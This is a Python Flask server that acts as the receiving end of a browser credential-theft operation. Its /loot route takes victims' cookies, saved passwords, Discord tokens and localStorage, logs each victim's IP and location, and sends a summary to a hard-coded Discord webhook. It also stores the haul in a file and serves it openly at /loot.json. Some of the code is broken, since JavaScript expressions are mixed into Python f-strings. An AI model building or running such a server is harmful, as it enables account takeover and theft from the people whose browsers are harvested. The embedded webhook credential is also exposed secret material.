from flask import Flask, request, jsonify
import json
import os
import requests
from datetime import datetime
import logging

app = Flask(__name__)

# YOUR WEBHOOK (already configured)
WEBHOOK_URL = "https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER"
CREDS_FILE = 'browser_loot.json'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
        data = response.json()
        return f"{data.get('city', 'N/A')}, {data.get('country_name', 'N/A')}"
    except:
        return "Unknown"

def send_to_webhook(loot):
    """Enhanced webhook with full browser loot"""
    embed = {
        "title": "🕷️ FULL BROWSER LOOT CAPTURED",
        "description": f"**Victim IP:** `{loot['ip']}`\n**Location:** {loot['location']}",
        "color": 0xff6b6b,
        "fields": [
            {"name": "🍪 Cookies", "value": f"`{len(loot.get('cookies', ''))}` chars", "inline": True},
            {"name": "🔑 Passwords", "value": f"`{len(loot.get('passwords', []))}` found", "inline": True},
            {"name": "💎 Discord Tokens", "value": f"`{Object.keys(loot.get('discordTokens', {})).length}` extracted", "inline": True},
            {"name": "📱 LocalStorage", "value": f"`{Object.keys(loot.get('localStorage', {})).length}` items", "inline": True}
        ],
        "footer": {"text": f"{loot['timestamp'][:19]} | UA: {loot['user_agent'][:40]}..."},
        "thumbnail": {"url": "https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg"}
    }
    
    payload = {"embeds": [embed], "username": "Browser Loot Bot"}
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        logger.info(f"✅ Webhook delivered: {loot['ip']}")
    except Exception as e:
        logger.error(f"❌ Webhook failed: {e}")

def save_loot(loot):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr.split(',')[0].strip())
    location = get_ip_info(ip)
    
    full_loot = {
        **loot,
        'ip': ip,
        'location': location,
        'user_agent': loot.get('fingerprint', {}).get('userAgent', 'Unknown'),
        'timestamp': datetime.now().isoformat()
    }
    
    # Send to webhook
    send_to_webhook(full_loot)
    
    # Save full raw data locally
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, 'r') as f:
            existing = json.load(f)
    else:
        existing = []
    
    existing.append(full_loot)
    with open(CREDS_FILE, 'w') as f:
        json.dump(existing, f, indent=2)
    
    logger.info(f"🕷️ LOOT: {ip} - {len(loot.get('cookies', ''))} cookie chars + tokens")

@app.route('/')
def index():
    with open('index.html') as f:
        return f.read()

@app.route('/loot', methods=['POST'])
def loot():
    loot_data = request.get_json()
    save_loot(loot_data)
    return jsonify({'success': True})

@app.route('/loot.json')
def get_loot():
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, 'r') as f:
            return f.read()
    return "No loot yet."

# Static files
@app.route('/style.css')
def css(): return open('style.css').read()
@app.route('/script.js')
def js(): return open('script.js').read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
